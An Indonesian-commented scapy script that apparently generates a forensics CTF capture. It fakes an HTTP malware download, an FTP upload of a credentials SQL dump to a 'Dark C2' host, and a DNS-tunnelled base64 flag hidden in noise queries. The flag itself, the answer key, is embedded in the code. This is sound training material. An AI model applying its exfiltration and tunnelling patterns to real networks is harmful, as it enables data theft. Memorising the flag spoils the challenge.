#!/usr/bin/env python3
import random
from scapy.all import *

print("[*] Memulai pembuatan PCAP (HTTP, FTP, dan DNS)...")
packets = []

def add_tcp_stream(src, dst, sport, dport, payloads):
    """Fungsi untuk memalsukan TCP 3-Way Handshake & Data Transfer agar Wireshark bisa 'Follow Stream'"""
    seq = random.randint(1000, 9000)
    ack = random.randint(1000, 9000)
    
    packets.append(IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags="S", seq=seq))
    seq += 1
    packets.append(IP(src=dst, dst=src)/TCP(sport=dport, dport=sport, flags="SA", seq=ack, ack=seq))
    ack += 1
    packets.append(IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags="A", seq=seq, ack=ack))

    for is_client_to_server, data in payloads:
        if is_client_to_server:
            packets.append(IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags="PA", seq=seq, ack=ack)/Raw(load=data))
            seq += len(data)
            packets.append(IP(src=dst, dst=src)/TCP(sport=dport, dport=sport, flags="A", seq=ack, ack=seq))
        else:
            packets.append(IP(src=dst, dst=src)/TCP(sport=dport, dport=sport, flags="PA", seq=ack, ack=seq)/Raw(load=data))
            ack += len(data)
            packets.append(IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags="A", seq=seq, ack=ack))

    packets.append(IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags="FA", seq=seq, ack=ack))
    seq += 1
    packets.append(IP(src=dst, dst=src)/TCP(sport=dport, dport=sport, flags="FA", seq=ack, ack=seq))
    ack += 1
    packets.append(IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags="A", seq=seq, ack=ack))


print("[*] Menyuntikkan paket HTTP (Unduh Malware)...")
http_payloads = [
    (True, b"GET /downloads/mass_encryptor_v2.elf HTTP/1.1\r\nHost: 103.15.22.99\r\nUser-Agent: curl/7.68.0\r\nAccept: */*\r\n\r\n"),
    (False, b"HTTP/1.1 200 OK\r\nServer: nginx\r\nContent-Type: application/x-executable\r\nContent-Length: 42\r\n\r\n\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00<FAKE_MALWARE_BINARY_FOR_CTF>")
]
add_tcp_stream("192.168.100.10", "103.15.22.99", 54321, 80, http_payloads)


print("[*] Menyuntikkan paket FTP (Eksfiltrasi Data)...")
ftp_cmd_payloads = [
    (False, b"220 Welcome to Dark C2 FTP Server.\r\n"),
    (True, b"USER dark_collector\r\n"),
    (False, b"331 Please specify the password.\r\n"),
    (True, b"PASS super_secret_pwn3d!\r\n"),
    (False, b"230 Login successful.\r\n"),
    (True, b"TYPE I\r\n"),
    (False, b"200 Switching to Binary mode.\r\n"),
    (True, b"PASV\r\n"),
    (False, b"227 Entering Passive Mode (103,15,22,99,195,89).\r\n"),
    (True, b"STOR database.sql\r\n"),
    (False, b"150 Ok to send data.\r\n"),
    (True, b"QUIT\r\n"),
    (False, b"226 Transfer complete.\r\n221 Goodbye.\r\n")
]
add_tcp_stream("192.168.100.10", "103.15.22.99", 54322, 21, ftp_cmd_payloads)

sql_file_content = b"-- MySQL Dump\n-- Database: cybernusa_hrd\n\nCREATE TABLE tb_employee_credentials (\n  id int(11) NOT NULL AUTO_INCREMENT,\n  username varchar(50) NOT NULL,\n  password varchar(255) NOT NULL,\n  PRIMARY KEY (id)\n);\n\nINSERT INTO tb_employee_credentials VALUES (1, 'admin_hr', 'HrdAdmin2026!@#');\nINSERT INTO tb_employee_credentials VALUES (2, 'ceo_boss', 'P4ssw0rdB0ss');\n\n-- Exfiltration completed.\n"
add_tcp_stream("192.168.100.10", "103.15.22.99", 54323, 50009, [(True, sql_file_content)])


print("[*] Menyuntikkan paket DNS Tunneling dan Noise...")
b64_flag = "Q09ORklSTTpfRVhGSUxfQ09NUExFVEVEXzk5OA=="
n = 2 
chunks = [b64_flag[i:i+n] for i in range(0, len(b64_flag), n)]

noise_domains = ["google.com", "facebook.com", "update.microsoft.com", "apple.com", "amazon.com", "ubuntu.com"]
record_types = ["A", "AAAA", "TXT"]

chunk_index = 0
for i in range(15067): 
    src_ip = f"192.168.100.10"
    dst_ip = "8.8.8.8"
    
    if chunk_index < len(chunks) and random.random() < 0.05:
        chunk = chunks[chunk_index]
        seq_str = f"seq{chunk_index+1:02d}.hacker-c2.net"
        
        req = IP(src=src_ip, dst=dst_ip)/UDP(sport=random.randint(1024, 65535), dport=53)/DNS(rd=1, qd=DNSQR(qname=seq_str, qtype="TXT"))
        res = IP(src=dst_ip, dst=src_ip)/UDP(sport=53, dport=req[UDP].sport)/DNS(id=req[DNS].id, qr=1, aa=1, qd=req[DNS].qd, an=DNSRR(rrname=seq_str, type="TXT", rdata=chunk))
        
        packets.append(req)
        packets.append(res)
        chunk_index += 1
    else:
        qname = random.choice(noise_domains)
        qtype = random.choice(record_types)
        
        if qtype == "A":
            dummy_rdata = f"{random.randint(1,254)}.{random.randint(1,254)}.1.1"
        elif qtype == "AAAA":
            dummy_rdata = "2001:4860:4860::8888"
        else: 
            dummy_rdata = "v=spf1 include:_spf.google.com ~all"
            
        req = IP(src=src_ip, dst=dst_ip)/UDP(sport=random.randint(1024, 65535), dport=53)/DNS(rd=1, qd=DNSQR(qname=qname, qtype=qtype))
        res = IP(src=dst_ip, dst=src_ip)/UDP(sport=53, dport=req[UDP].sport)/DNS(id=req[DNS].id, qr=1, aa=1, qd=req[DNS].qd, an=DNSRR(rrname=qname, type=qtype, rdata=dummy_rdata))
        
        packets.append(req)
        packets.append(res)


print(f"[*] Menyatukan total {len(packets)} paket jaringan...")
wrpcap("server_traffic_final.pcap", packets)
print("[+] DONE! File 'server_traffic_final.pcap' siap digunakan oleh peserta!")